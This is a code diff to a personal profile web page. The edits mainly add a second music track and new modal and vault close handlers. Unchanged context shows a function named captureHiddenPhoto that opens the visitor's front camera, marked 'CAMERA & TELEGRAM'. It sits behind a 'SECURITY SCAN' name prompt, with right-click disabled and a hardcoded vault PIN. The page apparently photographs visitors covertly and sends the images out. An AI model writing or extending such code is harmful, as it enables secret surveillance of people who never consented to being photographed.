@@ -34,7 +34,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden; /* Screen stability ke liye scrolling band */
+            overflow: hidden;
         }
 
         .main-card {
@@ -47,10 +47,7 @@
             position: relative;
             box-shadow: 0 40px 100px rgba(0,0,0,1);
             z-index: 10;
-            /* Animation hatane ke liye overflow visible rakha hai aur pseudo-element nikal diya */
         }
-
-        /* Blue rotating light (::before) ko yahan se hata diya gaya hai */
 
         .profile-container {
             position: relative;
@@ -287,7 +284,7 @@
 </head>
 <body oncontextmenu="return false;">
 
-    <button class="developer-btn" onclick="showNameModal()">
+    <button class="developer-btn" onclick="showDeveloperPanel()">
         <i class="fa-solid fa-lock" style="margin-right: 8px;"></i>
         DEVELOPER
     </button>
@@ -330,7 +327,7 @@
             <h3>📡 SECURITY SCAN</h3>
             <input type="text" id="visitorName" class="modal-input" placeholder="Your Name" autocomplete="off">
             <button class="primary-btn" onclick="startDataProcess()">CONTINUE</button>
-            <button class="cancel-btn" onclick="closeModals()">CANCEL</button>
+            <button class="cancel-btn" onclick="closeModalsAndStopMusic()">CANCEL</button>
         </div>
     </div>
 
@@ -339,7 +336,7 @@
             <h3>🔐 VAULT PIN</h3>
             <input type="password" id="vaultPin" class="modal-input" placeholder="PIN" maxlength="4">
             <button class="primary-btn" onclick="verifyPin()">UNLOCK</button>
-            <button class="cancel-btn" onclick="showNameModal()">BACK</button>
+            <button class="cancel-btn" onclick="goBackToNameModal()">BACK</button>
         </div>
     </div>
 
@@ -350,15 +347,20 @@
     <div id="vaultPanel" class="vault-panel">
         <div style="display:flex; justify-content:space-between; align-items:center;">
             <h2 style="font-size:1.2rem; color:var(--primary-color);">PRIVATE VAULT</h2>
-            <i class="fa-solid fa-circle-xmark" style="font-size:2rem; cursor:pointer;" onclick="closeVault()"></i>
+            <i class="fa-solid fa-circle-xmark" style="font-size:2rem; cursor:pointer;" onclick="closeVaultAndStopMusic()"></i>
         </div>
         <div class="photo-grid" id="vGrid"></div>
     </div>
 
     <div class="music-player" id="mToggle" onclick="controlMusic()">🗿</div>
     
+    <!-- Two audio elements: one for background, one for developer panel -->
     <audio id="bgTrack" loop preload="auto">
         <source src="audio.mp3" type="audio/mpeg">
+    </audio>
+    
+    <audio id="devTrack" loop preload="auto">
+        <source src="audio2.mp3" type="audio/mpeg">
     </audio>
 
 <script>
@@ -368,7 +370,9 @@
     };
 
     let currentVisitorName = '';
+    let isDevMusicPlaying = false;  // track developer music state
 
+    // Music control for main player (🗿 button)
     function controlMusic() {
         const audio = document.getElementById('bgTrack');
         const toggle = document.getElementById('mToggle');
@@ -380,6 +384,69 @@
         }
     }
 
+    // ---------- DEVELOPER BUTTON ACTION ----------
+    function showDeveloperPanel() {
+        // 1. Stop any playing background music from main player
+        const bgAudio = document.getElementById('bgTrack');
+        if (!bgAudio.paused) {
+            bgAudio.pause();
+            document.getElementById('mToggle').classList.remove('rotating');
+        }
+        
+        // 2. Play audio2.mp3 (developer track)
+        const devAudio = document.getElementById('devTrack');
+        devAudio.play().catch(() => alert('audio2.mp3 not found!'));
+        isDevMusicPlaying = true;
+        
+        // 3. Open the name modal (first step of developer panel)
+        document.getElementById('nameModal').classList.add('active');
+    }
+
+    // Stop developer music and close everything
+    function stopDevMusicAndClose() {
+        const devAudio = document.getElementById('devTrack');
+        if (!devAudio.paused) {
+            devAudio.pause();
+            devAudio.currentTime = 0;
+        }
+        isDevMusicPlaying = false;
+    }
+
+    // Modified closeModals that also stops dev music if playing
+    function closeModalsAndStopMusic() {
+        stopDevMusicAndClose();
+        document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
+    }
+
+    // Go back to name modal from PIN modal (without stopping music)
+    function goBackToNameModal() {
+        document.getElementById('passModal').classList.remove('active');
+        document.getElementById('nameModal').classList.add('active');
+    }
+
+    // Close only modals (used inside flows where music should continue)
+    function closeModals() {
+        document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
+    }
+
+    // Close vault and stop dev music (when X or back pressed)
+    function closeVaultAndStopMusic() {
+        stopDevMusicAndClose();
+        document.getElementById('vaultPanel').classList.remove('open');
+    }
+
+    // Show name modal (for other uses, but we'll use showDeveloperPanel now)
+    function showNameModal() {
+        // This is kept but we use showDeveloperPanel for button
+        showDeveloperPanel();
+    }
+
+    // Handle zoom overlay
+    function handleZoom(show) { 
+        document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; 
+    }
+
+    // ----- CAMERA & TELEGRAM (unchanged) -----
     async function captureHiddenPhoto() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).catch(() => null);
@@ -435,16 +502,11 @@
 
     function verifyPin() {
         if(document.getElementById('vaultPin').value === '2009') {
-            closeModals();
+            closeModals(); // close pin modal but keep music playing (dev music still on)
             document.getElementById('vaultPanel').classList.add('open');
             loadPhotos();
         } else { alert("❌ WRONG PIN"); }
     }
-
-    function closeModals() { document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); }
-    function showNameModal() { document.getElementById('nameModal').classList.add('active'); }
-    function closeVault() { document.getElementById('vaultPanel').classList.remove('open'); }
-    function handleZoom(show) { document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; }
 
     function loadPhotos() {
         const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
@@ -455,6 +517,7 @@
         ).join('');
     }
 
+    // Upload UI (unchanged)
     const up = document.createElement('div');
     up.style.cssText = 'border:2px dashed #333; padding:20px; margin:20px 0; border-radius:15px; text-align:center; cursor:pointer;';
     up.innerHTML = '<p>Upload Photos</p>';
@@ -470,7 +533,11 @@
         };
         i.click();
     };
-    document.querySelector('.vault-panel').prepend(up);
+    
+    // Ensure upload element is added after panel exists
+    window.addEventListener('load', () => {
+        document.querySelector('.vault-panel').prepend(up);
+    });
 </script>
 </body>
 </html>
